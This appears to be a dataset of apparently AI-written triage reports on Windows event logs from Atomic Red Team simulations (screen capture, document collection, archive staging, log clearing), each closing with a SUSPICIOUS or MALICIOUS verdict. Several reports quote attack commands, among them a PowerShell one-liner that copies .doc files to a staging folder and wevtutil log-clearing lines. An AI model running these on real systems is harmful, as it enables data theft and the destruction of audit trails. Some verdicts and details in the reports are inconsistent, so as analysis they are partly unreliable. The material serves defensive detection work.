   - The presence of scripts and commands from the directory path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\` are typically used for testing various MITRE ATT&CK techniques in a controlled manner. These could indicate a legitimate red team exercise or malicious actors trying to simulate attack behaviors for evasion testing or reconnaissance.

5. **Automated Processes Related to Edge Update**: 
   - There is significant activity around `MicrosoftEdgeUpdate.exe`, which appears to be part of legitimate software update tasks running under NT AUTHORITY\SYSTEM.
   
6. **Unusual Elevated Privilege Logons**: 
   - Several processes are running with high integrity levels under a test admin account, which might suggest privilege misuse or testing of elevated privileges.

**Assessment and Guidance:**
Given the various indicators:

- The combination of PowerShell script execution with bypassed policies, event log clearing, and the execution of scripts associated with Atomic Red Team tools suggests there is highly suspicious activity on this host. While it could indicate a legitimate security test, without further context or confirmation from the security team managing the environment, this could also be indicative of an ongoing or attempted breach.

**Resolution: SUSPICIOUS**

**Next Steps:**
1. **Immediate Investigation**: Confirm with the internal security team whether any authorized red teaming or security assessments were scheduled, which could account for these activities.
2. **Audit and Monitor**: Implement continuous monitoring of the account `SERVER002\admin_test` and related activities. Identify any other associated systems if part of a larger campaign.
3. **Forensics**: Perform further forensic analysis on the host to uncover other signs of compromise, such as unusual files, network connections, or changes in configuration.
4. **Log Restoration**: If not part of a legitimate test, consider restoring previous logs if possible and revisit other logs for further evidence.
5. **Security Measures**: Reinforce security controls to restrict PowerShell execution policies and enhance logging and alerting configurations to detect similar activities preemptively in the future."
Windows Screen Capture (CopyFromScreen),"## Detailed Analysis of Logs:

### PowerShell Activity:
1. The PowerShell logs indicate the execution of a script that uses `System.Windows.Forms` and `Drawing.Bitmap` to capture the screen and save it as a `T1113.png` file in the temporary folder. This is a typical behavior consistent with the **T1113** technique, which refers to Screen Capture or Screenshot functionality often used by malicious actors for reconnaissance or espionage.

### Security Logs:
1. The security log shows an event with ID **1102** indicating the security log was cleared by the user `SERVER002\admin_test` at the time `2024-10-24 20:49:19`. The clearing of event logs can be a means to hide malicious activity and is typically a red flag for potential malicious intent, as attackers often clear logs to cover their tracks after performing unauthorized actions.

2. The Event ID **4616** is logged, which indicates that the system time was changed. Changes to system time settings can be benign in some cases, such as syncing to a time server. However, if unauthorized, it could be a measure to bypass time-based security controls.

### Sysmon Logs:
1. Sysmon logs capture multiple executions of `wevtutil.exe` with the `cl` command, indicating clearing of event logs, specifically the 'Microsoft-Windows-Sysmon/Operational', 'Application', 'System', 'Security', and 'Windows PowerShell' channels. This action corresponds with the entries found in the System and Security logs.

2. The `wsmporvhost.exe` process spawning multiple `hostname.exe`, `whoami.exe`, and `powershell.exe` processes can suggest potential abuse of Windows Management Instrumentation (WMI). While the individual commands `hostname` and `whoami` are not inherently malicious, combined with the context, it hints at information gathering.

### System Logs:
1. System logs reflect multiple clearances logged with Event ID **104**, complementing the findings of log clearances observed in other logs.

### Application Logs:
1. There are no direct indicators of malicious activity in the Application logs. However, the context of other event logs suggests they may have been utilized in a broader illicit activity.

## Assessment:
- **Suspicious Behavior**: The consistent theme of log clearing across multiple channels, combined with unauthorized usage of PowerShell for capturing the screen, indicates that the system might be compromised.
- **Indicators of Malicious Activity**: Specifically, the PowerShell script for screen capture, the clearing of log events, and WMI process spawning reflecting parsing (potentially for reconnaissance or lateral movement) are solid indicators of unauthorized activities.

## Threat or Risk Identified:
- The presence of a user 'admin_test' executing potentially malicious actions, clearing event logs, and attempting a screen capture are all highly suspicious and indicative of possible compromise.
  
## Guidance for Proceeding:
1. **Resolution**: **MALICIOUS**
2. **Actions**:
   - Immediately isolate the affected system, `Server002`, from the network to prevent further potential damage or information leakage.
   - Conduct a thorough forensic investigation to identify the extent of the compromise and preserve evidence for possible legal proceedings.
   - Reset or remove any user credentials associated with `admin_test` and perform a full credential audit.
   - Implement stricter PowerShell logging and monitoring solutions, as well as endpoint detection and response mechanisms to quickly detect similar future activities.

This assessment should be considered in light of the broader network environment and any additional context not available in the logs provided."
Automated Collection PowerShell,"Based on the investigation of the provided Windows event logs, here's a detailed analysis uncovering suspicious patterns:

### Suspicious Behavior Identified:

1. **Clearing of Event Logs:**
    - Several system and security event log files were cleared by the user `admin_test`. 
      - **Security Event Log Cleared:** Event ID 1102 recorded at 2024-10-25 10:08:39 indicates that the Security log was cleared.
      - **System Log Cleared:** Event ID 104 recorded at similar timestamps suggests that the System log was also cleared.
    - Purposeful clearing of event logs is a common tactic used by malicious entities to erase tracks and is highly suspect.

2. **PowerShell Usage:**
    - A PowerShell command was executed to create a directory in the temporary folder and recursively copy `.doc` files to this directory. This command is recorded under the Sysmon logs where `powershell.exe` was executed with the command:
      - `New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null, Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}`
    - This type of activity could be indicative of data exfiltration activity, which is suspicious unless confirmed to be part of a legitimate administrative task.

3. **High-Integrity Processes by `admin_test`:**
    - Numerous high-integrity level processes such as `wevtutil.exe`, `hostname.exe`, and `whoami.exe` were executed under the user `admin_test`. While not inherently malicious, their execution alongside the concerning activities raises suspicions.
  
4. **Anomalies in Time Synchronization:**
    - Multiple adjustments to system time within close intervals, though logged as svchost.exe activities, could correlate with attempts to obfuscate unauthorized access timestamps.

### Assessment:

- **Log Clearing by `admin_test`:** Given that logs were cleared by an account with administrative privileges, it's critical to confirm whether such actions were sanctioned as part of routine system maintenance or if they represent an unauthorized attempt to erase digital footprints.
  
- **PowerShell Script Execution:** The presence of a PowerShell script that duplicates documents from within the system to a dedicated collection folder is characteristic of abnormal behavior unless tied to documented and approved administrative operations.

### Conclusion:

Based on the suspicious behavior detailed above, especially the clearing of security and system logs, and the execution of PowerShell scripts designed for potential data exfiltration or system reconnaissance, the activity observed in the logs is determined to be **MALICIOUS**.

### Recommendations:

- **Immediate Action:**
  - Conduct a comprehensive audit of `admin_test` account activities.
  - Isolate and preserve any evidence related to suspicious activities for further forensic analysis.
  - Review and analyze additional logs or systems that could have been affected.
  
- **Preventive Measures:**
  - Implement alerting mechanisms for high-risk actions like log clearing.
  - Enforce stricter access controls and logging for account privileges.
  - Review and revise PowerShell execution policies, limiting commands that can be run without audit or approval."
Stage data from Discovery.bat,"## Detailed Log Analysis

### System Log Analysis
- **Event ID 104, Event Logs Cleared**:
  - `admin_test` cleared both the System and Windows PowerShell event logs. Clearing event logs is a common tactic used by attackers to remove traces of their activity and is generally considered suspicious and potentially malicious behavior, especially if there's no legitimate reason provided by IT administrators.

### Application Log Analysis
- **Event ID 16384 and Edge Update Events**:
  - Routine system maintenance and updates (e.g., Edge) appear to be happening. These logs do not indicate malicious behavior on their own, as these could simply be part of standard software updating processes.

### PowerShell Log Analysis
- **Event ID 600, PowerShell Command Execution**:
  - The execution of `powershell.exe` with the command to `Invoke-WebRequest` from a GitHub repository to download a batch file. The URL leads to a known testing script from the Atomic Red Team, which is often used for security testing but could also indicate potential misuse if not sanctioned as part of an authorized security exercise.

### Sysmon Log Analysis
- **Event IDs 1 and 5, Process Creation and Termination**:
  - Multiple `wevtutil.exe` executions to clear Windows system logs (`Security`, `Application`, `System`, and `PowerShell`). These actions correlate with the earlier system log clearing events, further reinforcing suspicious behavior.
  - Frequent invocations of the `conhost.exe` processes are seen as benign co-executions in the context of command-line utilities and PowerShell commands.

### Security Log Analysis
- **Event ID 1102, Security Log Cleared**:
  - The clearing of security logs is again performed by `admin_test`, paralleling System and PowerShell logs. This further supports the potential malicious intent to hide unauthorized or suspicious activities.
- **Event ID 4634, 4672, 4624**:
  - The log contains activities where `admin_test` is assigned significant privileges (SeDebugPrivilege and others), indicating potential privilege escalation.

### Indicators of Malicious Activity
1. **Event Log Clearing**: Repeated log clearing events are a strong indicator of possible malicious intent. This, combined with the high privilege levels and suspicious activities, is troubling.
2. **Suspicious PowerShell Download**: The use of PowerShell to download scripts from the web suggests potentially unauthorized actions, especially in conjunction with the clearing of logs.
3. **Unauthorized Privilege Assignment**: The presence of highly elevated privileges connected to user actions that cleared logs and executed potentially unauthorized scripts.

### Summary and Recommendations
Based on the combination of events such as log clearing, PowerShell downloads of external scripts, and high privilege logons, these logs strongly indicate malicious behavior.

### Resolution: MALICIOUS
- **Recommendation**: 
  - Isolate the host (Server002) from the network immediately to prevent further potential compromise.
  - Conduct a detailed forensic investigation to understand the full impact and extent of the breach.
  - Review `admin_test` account activity for verification and determine if it needs to be restricted or reset.
  - Ensure further PowerShell executions are monitored and restricted to prevent unauthorized script loads.
  - Educate users and reinforce policies against unauthorized script executions and ensure proper logging and alerting for similar activities in the future."
Compress Data and lock with password for Exfiltration with winrar,"### Detailed Analysis

Upon reviewing the logs from the provided information, we can identify several points of interest that imply suspicious behaviors:

1. **Event Log Clearing**:
   - There are multiple entries in the System and Security logs indicating that logs were cleared (`EventID 104` for System, `EventID 1102` for Security). This is a known tactic used by attackers to cover their tracks and hinder investigation efforts. The frequent and nearly simultaneous clearing of logs across different channels is highly suspicious.

2. **Process Execution Activities**:
   - Sysmon logs reveal various cmd.exe and wevtutil.exe executions. Notably, the command line cleared Windows event logs (e.g., `wevtutil.exe cl`) executed multiple times by the user `admin_test`. This behavior aligns with obfuscation or track-covering methods often employed in malicious activity.
   - Additionally, `cmd.exe` executed with commands indicative of data manipulation and compression (e.g., creation of temporary directories and password-protected RAR archives), which could suggest preparatory steps for data exfiltration or ransomware activities.

3. **Privilege Escalation and Use**:
   - Security logs note an explicit use of privileged accounts and tokens (`EventID 4672`) revealing several high-privilege rights assignments. This usage was orchestrated by `SYSTEM`, typical during normal operations but suspicious when linked with other atypical activities like log clearances.

4. **Use of Temporary and Uncommon Execution Locations**:
   - Files such as `MicrosoftEdgeUpdate.exe` executed from temporary directories are not standard behavior. While updates and installers can occasionally use temporary paths, it is essential to verify these paths and hashes against known-good baselines.

5. **Commands Indicative of Reconnaissance and Potential Abuse**:
   - Commands like `cmd.exe /c if not exist ""%%programfiles%%/WinRAR/Rar.exe""` suggest checks for specific tools, potentially for later use in compressing or encrypting files, possibly as a component of an attack.

### Assessment
Considering the above activities:
- The repetitive clearing of logs across multiple channels suggests a deliberate attempt to obfuscate or disguise harmful activities.
- The use of administrative credentials combined with clearing logs and executing scripts for potential data handling supports the hypothesis of intentional malevolent actions rather than legitimate user activities.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Mitigation**:
   - Stop any running processes that resemble those indicated in the logs, and isolate the machine from the network to prevent further potential lateral movement or data exfiltration.

2. **Investigation and Logging**:
   - Retain all available logs, disk images, and volatile data for further in-depth forensic analysis.
   - Check for additional compromised accounts or unauthorized changes in privileges.

3. **Incident Response Plan Activation**:
   - Activate your organization's incident response protocol to help contain and remediate the suspected security incident.
   - Identify and document all affected systems and data to prioritize recovery and containment efforts.

4. **Communication**:
   - Notify the security team and relevant stakeholders of the potential breach, following company policy regarding internal and external communication about breaches or suspected incidents."
using device audio capture commandlet,"Upon reviewing the provided Windows event logs, several indications raise concerns about potentially malicious activity on the monitored machine (Server002). Here's a detailed analysis of the suspicious activities observed in the logs:

1. **Log Cleared Events (EventID: 104, 1102):**
    - Multiple log files (System, Windows PowerShell, and Security logs) have been cleared within a very short timeframe. These actions were performed by the user ""admin_test"" using the command `wevtutil` (Event ID: 17953, 17954, etc.).
    - The clearing of event logs can often be an indication of malicious activity as attackers often clear logs to erase tracks of their unauthorized actions.

2. **Unusual Use of `wevtutil.exe`:**
    - The `wevtutil.exe` tool is shown to be used repeatedly in a short span to clear different logs (Application logs included). While the tool itself is legitimate, its misuse for clearing logs without a clear and justifiable reason is suspicious.

3. **PowerShell Execution:**
    - The execution of PowerShell scripts from a temporary directory, and particularly a script named `WindowsAudioDevice-Powershell-Cmdlet`, can be indicative of a potential malicious script or unauthorized code execution (Event IDs: 17961, 17963).
    - The use of PowerShell for executing commands is a common tactic used by attackers to perform various malicious activities while trying to blend in with normal administrative tasks.

4. **Process Anomalies:**
    - The repeated queries of command-line tools such as `whoami.exe` (Event IDs: 17941, 17957) and `hostname.exe` might be benign but could also indicate attempts to gather information about the environment by an unauthorized user.

5. **Time Change Events (EventID: 4616):**
    - There are two instances of system time changes that coincide with log clearing activities. While this could be benign (like daylight saving adjustments), it warrants scrutiny due to the context of other events.

**Assessment:**
Given these findings, the activities conducted by ""admin_test"" are highly suspicious due to the deliberate clearing of logs and command-line executions from unusual directories. This behavior strongly aligns with tactics often employed by attackers to hide their activities and maintain persistence on a compromised system.

**Resolution: MALICIOUS**
- Based on the events and their interrelation, I am confident that the activities logged here constitute potentially malicious actions.

**Guidance for Mitigation:**
1. Initiate a comprehensive security audit and forensic analysis of Server002. Investigate ""admin_test"" session logs and any unusual account activities.
2. Check for other indicators of compromise (IOCs) on user accounts and systems that ""admin_test"" may have accessed.
3. Restrict the use of administrative tools unless necessary and implement strict monitoring.
4. Evaluate and potentially enhance the organization's logging and monitoring policies to detect and respond to similar incidents effectively in future.
5. Consider isolating the affected system to prevent further unauthorized access and data exfiltration."
Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted,"Upon analyzing the provided Windows event logs from Server002, certain activities suggest suspicious behavior. Here’s a detailed breakdown of these indicators:

### Powershell Log Analysis:
- **Registry Modifications:** The PowerShell logs show activities related to modifying the Windows Registry keys under `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI` to add and then immediately delete a registry value (`DisableAIDataAnalysis`). This behavior is typically unconventional and might indicate an attempt to obfuscate traces or execute commands requiring persistence without being captured by audits regularly.
  
### Security Log Analysis:
- **Log File Clearance:** Event ID 1102 indicates that the security log was cleared by a user `admin_test`. This activity is highly suspicious as attackers often clear logs to cover their tracks after unauthorized activities.

### Sysmon Log Analysis:
- **Event Log Clearance:** We see multiple events involving the use of `wevtutil` to clear event logs (`Application`, `Security`, and `System`). These are annotated by command lines such as `""C:\Windows\system32\wevtutil.exe"" cl Security`. Clearing logs is commonly associated with malicious behavior, especially if unauthorized users perform it.
- **PowerShell Execution:** The entry for PowerShell execution shows it was used to run a command involving registry edits which aligns with the suspicious PowerShell log entries indicating attempts to modify registry values.
- **Timestamp Correlation:** The majority of these suspicious events are closely timestamped around `2024-10-24 20:52:22`, suggesting they were executed in quick succession, likely in an automated way through a script.

### Application Log Analysis:
- **Edge Updates:** There are multiple Edge update events around the same timestamp primarily involving system processes. These might be benign if they match with legitimate software updates.

### System Log Analysis:
- **Event Log Cleared for System:** Similar to the Security log, the System log was cleared by the same user `admin_test`, reinforcing the suspicion that normal auditing capabilities were being deliberately tampered with.

### Conclusion:
- The events where logs were cleared, combined with suspicious PowerShell and registry activities, strongly suggest actions professionals take when trying to maintain persistence or evade detection post-compromise. The immediate clearing of logs after performing registry changes further supports the hypothesis of an intentional malicious operation.

### Final Assessment:
**MALICIOUS** - The activities observed in the logs, notably log clearance and unconventional registry edits executed via PowerShell, are indicators consistent with malicious intent, likely undertaken to conceal unauthorized or malicious activities on Server002.

### Recommendations:
1. **Isolation:** Immediately isolate the machine, Server002, to prevent further propagation or data exfiltration.
2. **Deep Investigation:** Conduct a deeper investigation, including forensic analysis of memory and disk images to identify potential backdoors, malware implants, or any data exfiltration attempts.
3. **Audit and Review:** Consider auditing user accounts, especially `admin_test` for unauthorized access, and review all privileged user actions.
4. **Patch and Protect:** Ensure all systems are patched and up-to-date with the latest security updates.
5. **Enhance Monitoring:** Strengthen monitoring and alerting for suspicious activities such as log clearances, registry changes, or unexpected network communications."
Zip a Folder with PowerShell for Staging in Temp,"After reviewing the provided Windows event logs, the following analysis highlights potential security concerns.

### Suspicious Activities Identified:

1. **PowerShell Usage (Windows PowerShell log)**:
   - Multiple entries indicate the use of PowerShell to compress files located in `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1074.001\\bin\\Folder_to_zip""`.
   - The use of `Compress-Archive` in a temporary directory could suggest data staging for exfiltration, which is a common tactic seen in malicious scenarios.

2. **Sysmon Logs**:
   - Entries showing the execution of `wevtutil.exe` to clear event logs: 
     - The command line `""C:\\Windows\\system32\\wevtutil.exe"" cl` followed by various logs (Application, System, Security, and Windows PowerShell) indicates an attempt to cover tracks, a tactic frequently employed by attackers.
   - Execution of `whoami.exe` and `hostname.exe` suggest reconnaissance activities that often precede deeper intrusions.

3. **System Logs**:
   - Event ID 104 indicates that logs for the System and Windows PowerShell channels were cleared.
   - Clearing of event logs (`EventID 104` used by admin_test) is a serious indicator of malicious behavior aiming to hide tracks.

4. **Security Logs**:
   - Event ID 1102: Security log was cleared. This action is highly indicative of malicious attempts to erase audit trails.

5. **Time Synchronization and Event Timestamps**:
   - Event ID 4616 indicates a slight discrepancy in the system time, which might be a system's automatic adjustment, but when combined with the other indicators, could be scrutinized further to understand the sequence of actions better.

### Assessment:
Based on the analysis, there are multiple indicators of potentially malicious activities, especially concerning the clearing of event logs and usage of PowerShell to manipulate files. The execution of utility processes and command lines such as `wevtutil.exe` under an admin account further suggests attempts to evade detection, aligning with known tactics of threat actors.

### Resolution:
**MALICIOUS** - The logs contain evidence of practices like event log clearing and suspicious command usage that strongly indicate malicious activity.

### Guidance:
- **Immediate Actions**: 
  - Conduct a comprehensive forensic analysis on the host to understand the extent of the compromise.
  - Isolate the affected system from the network to prevent possible lateral movement or data exfiltration.
  - Audit all administrative accounts and privileged access on the network.
  - Engage incident response teams to perform a deeper investigation and take necessary containment measures.

- **Long-term Actions**:
  - Strengthen monitoring and logging policies to detect early signs of compromise.
  - Implement stricter PowerShell execution policies, using AppLocker or other endpoint security solutions.
  - Regularly review and audit the access logs and configuration changes across critical systems."
Registry artefact when application use webcam,"Upon reviewing the provided Windows event logs, there are several indicators of potential malicious activity:

1. **Event Log Clearing**: The logs contain events indicating that the security log was cleared (Event ID 1102 in the security log) and that the system and Windows PowerShell logs were also cleared (Event ID 104 in the system log). This activity is highly suspicious as attackers often clear logs post-activity to cover their tracks.

2. **Unusual Command Execution**:
   - The Sysmon log contains entries where `wevtutil.exe` (Eventing Command Line Utility) was used to clear logs (observed with command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`). This tool is typically used to manage event logs and in this context, may indicate an attempt to hide actions.
   - A command execution involving `cmd.exe` that modifies registry settings related to the webcam usage using registry commands (`reg.exe`). The use of such commands without a legitimate reason might indicate an attempt to tamper with system settings for malicious purposes.

3. **Privilege Use**: The activities run under high integrity level (indicating administrative or elevated privileges), and actions are executed with a user that is associated with an ""admin_test"" account. Privilege escalation tactics are often used by attackers to gain full control over the host.

4. **Process Executions**: The execution of several legitimate Windows utilities like `whoami.exe`, `hostname.exe`, and various EdgeUpdate processes suggest reconnaissance activity and system interaction typical of an attacker trying to gather information or maintain persistence.

5. **Edge Update Processes**: While primarily benign, the number of Edge Update execution entries and the inclusion of temporary file executions could mask malicious updates or the execution of unauthorized software.

Considering the above points, the series of events present enough indications of potential malicious activity, specifically actions that are consistent with log tampering and potential system compromise. 

**Assessment**:
- The activities detailed in the logs suggest a compromise or suspicious activity intended to conceal actions and possibly escalate privileges or tamper with system settings. 

**Resolution**:
- **MALICIOUS**: The entries in the logs definitively suggest malicious activities. The clearing of logs, the execution of potentially suspicious command-line operations, and the use of high privilege actions align with tactics used by attackers to compromise a system.

**Guidance**:
- Initiate a full security incident response investigation.
- Perform forensic analysis on the machine to identify all points of compromise.
- Review user account activity, especially focusing on the `admin_test` account.
- Consider isolating the host from the network to prevent further damage or data exfiltration.
- Review and enhance security monitoring, including implementing alerts for log clearing and uncommon command executions."
Azure - Scan for Anonymous Access to Azure Storage (Powershell),"Based on the provided logs, there are notable indicators of potentially suspicious activity that warrant further investigation:

1. **Event Log Clearing**:
   - There are multiple instances of `wevtutil.exe` being used to clear logs, specifically the `Security`, `System`, and `Windows PowerShell` logs (seen in both the Security and System logs). The use of `wevtutil.exe` to clear logs is suspicious as it can be indicative of an attacker trying to cover their tracks. This action was carried out by a user named `admin_test`.

2. **PowerShell Activity**:
   - There is a PowerShell command being executed to access a specific URL: `https://T1530Test2.blob.core.windows.net//`. The command used `Invoke-WebRequest` to fetch data and handled potential exceptions, storing the response in a text file (`T1530Test2.txt`) in the temp directory. This type of activity could be related to data exfiltration or C2 communication, which matches the pattern of known malicious activity (like the MITRE ATT&CK technique T1530 - Data from Cloud Storage).

3. **Process Execution**:
   - The processes like `hostname.exe`, `whoami.exe`, and `conhost.exe`, while themselves benign, appear to be executed in sequence around the same time logs are cleared. Although `hostname.exe` and `whoami.exe` could be part of legitimate administrative actions, their simultaneous execution with suspicious PowerShell activity makes it contextually suspicious.
   
4. **Miscellaneous Observations**:
   - The execution of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) is less likely to be related to the suspicious activities observed but still noted for completeness.

**Assessment**:
Given the combination of event log clearing, the specific PowerShell activity, and the surrounding processes executed under the context of an administrative account, these logs contain multiple artifacts indicative of potentially malicious behavior.

**Resolution**: SUSPICIOUS

**Guidance**:
- Further investigation is needed to determine the legitimacy of the `admin_test` user actions.
- Investigate any potential unauthorized access to the `admin_test` account.
- Check whether the URL accessed by PowerShell is known, legitimate, or part of a malicious infrastructure.
- Implement stricter monitoring of PowerShell usages, especially those involving network requests and log manipulation.
- Consider performing a full forensic analysis of the host to uncover any additional indicators of compromise or persistence mechanisms."
Automated Collection Command Prompt,"Upon analyzing the provided logs, here is the detailed assessment:

1. **Log Cleared Events:**
   - The `System`, `Windows PowerShell`, and `Security` logs have been cleared by the user `admin_test` (Event IDs: 104 and 1102). Clearing of logs can be an indicator of malicious activity, as it is a technique attackers may use to cover their tracks.

2. **Suspicious Command Execution:**
   - The `Sysmon` logs capture command execution that iterates through the system looking for `.docx` files and copying them to a temporary folder (Event ID: 1 with Image: `cmd.exe` and CommandLine: `""cmd.exe"" /c mkdir %temp%\T1119_command_prompt_collection …`). This command execution appears related to a suspicious file collection activity, which is often indicative of unauthorized data gathering.

3. **Process Executions:**
   - The use of `wevtutil.exe` to clear event logs (log cleared using `wevtutil.exe`) is identified in `Sysmon` logs.
   - Several instances of `MicrosoftEdgeUpdate.exe` and other `EdgeUpdate` activities are observed. These match legitimate update processes, though frequent update activities could also present a potential vector for exploitation if not up-to-date or improperly configured.

4. **Privilege and Logon Events:**
   - Event ID 4672 indicates privilege assignments, including SeDebugPrivilege, which is concerning if executed outside normal administrative tasks without context.
   - Multiple logon events (Event ID: 4624) are present, a normal pattern, but should be correlated with expected user activities to ensure no unauthorized access has occurred.

**Assessment:**
- **SUSPICIOUS**: The combination of log clearing events and suspicious command execution for data collection suggests that these activities deviate from typical benign operations and require further investigation. While there's no definitive evidence of compromise, these patterns indicate potential malicious behavior or preparation for future activity.

**Guidance on How to Proceed:**
- Investigate the `admin_test` account for unauthorized accesses or changes.
- Review system and user activities around the time of log clearance and command execution to correlate with known events.
- Query additional related logs, especially from network devices, to track any unexpected data transfer.
- Implement a more rigorous audit of log access and maintain log backups to prevent loss of audit trails.
- Consider tightening access controls and monitoring on processes such as `wevtutil.exe` and command line utilities that could be exploited for malicious intent."
